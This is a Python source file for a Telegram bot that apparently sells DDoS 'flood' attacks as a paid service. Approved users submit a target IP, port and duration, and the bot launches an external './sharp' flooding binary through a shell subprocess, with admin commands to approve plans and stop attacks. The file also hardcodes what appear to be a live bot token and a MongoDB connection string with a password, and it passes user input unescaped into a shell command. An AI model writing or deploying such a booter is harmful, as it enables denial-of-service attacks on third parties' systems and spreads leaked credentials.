import os
import telebot
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import subprocess

# Initialize event loop
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Configuration
TOKEN = '7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0'
ADMIN_IDS = [8167507955]  # Admin user IDs
OWNER_USERNAME = "@seedhe_maut_bot"
MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
CHANNEL_ID = -1002512368825

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Database connection
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

# Bot initialization
bot = telebot.TeleBot(TOKEN)

# Global variables
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_attacks = {}  # Format: {user_id: [process1, process2,...]}
attack_pids = {}  # Track PIDs for stopping attacks

# Attack Functions
async def launch_attack(target_ip, target_port, duration, user_id):
    """Launch attack process and track it"""
    try:
        if target_port in blocked_ports:
            raise ValueError(f"Port {target_port} is blocked")
            
        command = f"./sharp {target_ip} {target_port} {duration} 70"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Track the process
        if user_id not in running_attacks:
            running_attacks[user_id] = []
        running_attacks[user_id].append(process)
        attack_pids[process.pid] = process
        
        # Wait for completion
        stdout, stderr = await process.communicate()
        
        # Clean up
        running_attacks[user_id].remove(process)
        del attack_pids[process.pid]
        
        return True
    except Exception as e:
        logging.error(f"Attack error: {e}")
        return False

async def stop_user_attacks(user_id):
    """Stop all attacks for a specific user"""
    stopped = 0
    if user_id in running_attacks:
        for process in running_attacks[user_id]:
            try:
                process.terminate()
                await process.wait()
                del attack_pids[process.pid]
                stopped += 1
            except Exception as e:
                logging.error(f"Error stopping process: {e}")
        running_attacks[user_id].clear()
    return stopped

async def stop_all_attacks():
    """Stop all running attacks globally"""
    stopped = 0
    for pid, process in list(attack_pids.items()):
        try:
            process.terminate()
            await process.wait()
            del attack_pids[pid]
            stopped += 1
        except Exception as e:
            logging.error(f"Error stopping process: {e}")
    running_attacks.clear()
    return stopped

# Helper Functions
def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_approved(user_id):
    user = users_collection.find_one({"user_id": user_id})
    return user and user.get('plan', 0) > 0

# Command Handlers
@bot.message_handler(commands=['start'])
def start(message):
    """Main menu with buttons"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(
        KeyboardButton("🌊 FLOOD START"),
        KeyboardButton("🛑 STOP ATTACK"),
        KeyboardButton("👤 MY ACCOUNT"),
        KeyboardButton("🛡️ ADMIN")
    )
    bot.send_message(
        message.chat.id,
        f"*🚀 FLOOD BOT*\nOwner: {OWNER_USERNAME}",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['approve', 'disapprove'])
def handle_approval(message):
    """Admin commands for user management"""
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only command", parse_mode='Markdown')
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            raise ValueError("Format: /approve USER_ID PLAN DAYS or /disapprove USER_ID")

        target_id = int(parts[1])
        
        if parts[0] == '/approve':
            if len(parts) < 4:
                raise ValueError("Need plan and days")
            plan = int(parts[2])
            days = int(parts[3])
            
            # Plan limits
            if plan == 1 and users_collection.count_documents({"plan": 1}) >= 99:
                raise ValueError("Plan 1 limit reached")
            if plan == 2 and users_collection.count_documents({"plan": 2}) >= 499:
                raise ValueError("Plan 2 limit reached")

            expiry = datetime.now() + timedelta(days=days)
            users_collection.update_one(
                {"user_id": target_id},
                {"$set": {
                    "plan": plan,
                    "valid_until": expiry.isoformat(),
                    "access_count": 0
                }},
                upsert=True
            )
            bot.reply_to(message, f"✅ Approved user {target_id}\nPlan: {plan}\nDays: {days}", parse_mode='Markdown')
            
        elif parts[0] == '/disapprove':
            users_collection.update_one(
                {"user_id": target_id},
                {"$set": {"plan": 0, "valid_until": ""}}
            )
            bot.reply_to(message, f"❌ Disapproved user {target_id}", parse_mode='Markdown')
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🌊 FLOOD START")
def flood_start(message):
    """Initiate flood attack"""
    if not is_approved(message.from_user.id):
        bot.reply_to(message, "❌ You're not approved", parse_mode='Markdown')
        return
        
    bot.reply_to(message, "Enter: IP PORT TIME", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_flood)

def process_flood(message):
    """Process flood parameters"""
    try:
        ip, port, time_ = message.text.split()
        port = int(port)
        
        if port in blocked_ports:
            raise ValueError(f"Port {port} blocked")
            
        # Launch attack
        asyncio.run_coroutine_threadsafe(
            launch_attack(ip, port, time_, message.from_user.id),
            loop
        )
        
        bot.reply_to(message,
            f"⚡ Attack launched:\nIP: {ip}\nPort: {port}\nTime: {time_}s\n"
            "⚠️ Don't abuse targets",
            parse_mode='Markdown'
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🛑 STOP ATTACK")
def stop_attack(message):
    """Stop user's attacks"""
    try:
        stopped = asyncio.run_coroutine_threadsafe(
            stop_user_attacks(message.from_user.id),
            loop
        ).result()
        
        if stopped > 0:
            bot.reply_to(message, f"🛑 Stopped {stopped} attacks", parse_mode='Markdown')
        else:
            bot.reply_to(message, "⚠️ No running attacks found", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "👤 MY ACCOUNT")
def account_info(message):
    """Show user account status"""
    user = users_collection.find_one({"user_id": message.from_user.id})
    if user:
        response = (
            f"*ACCOUNT INFO*\n"
            f"User: @{message.from_user.username}\n"
            f"Plan: {user.get('plan', 0)}\n"
            f"Valid until: {user.get('valid_until', 'N/A')}\n"
            f"Status: {'✅ Approved' if user.get('plan',0) > 0 else '❌ Not approved'}"
        )
    else:
        response = "❌ No account data"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🛡️ ADMIN")
def admin_contact(message):
    """Show admin contact"""
    bot.reply_to(message, f"📩 Contact admin: {OWNER_USERNAME}", parse_mode='Markdown')

# Admin-only commands
@bot.message_handler(commands=['stopall'])
def admin_stop_all(message):
    """Admin command to stop all attacks"""
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only", parse_mode='Markdown')
        return
        
    try:
        stopped = asyncio.run_coroutine_threadsafe(
            stop_all_attacks(),
            loop
        ).result()
        bot.reply_to(message, f"🛑 Stopped all attacks ({stopped})", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')

# Main execution
def run_bot():
    """Main bot running function"""
    logging.info("Starting bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # Start background thread for asyncio
    Thread(target=run_bot, daemon=True).start()
    
    # Run asyncio loop in main thread
    try:
        loop.run_forever()
    except KeyboardInterrupt:
        logging.info("Shutting down...")
    finally:
        loop.close()
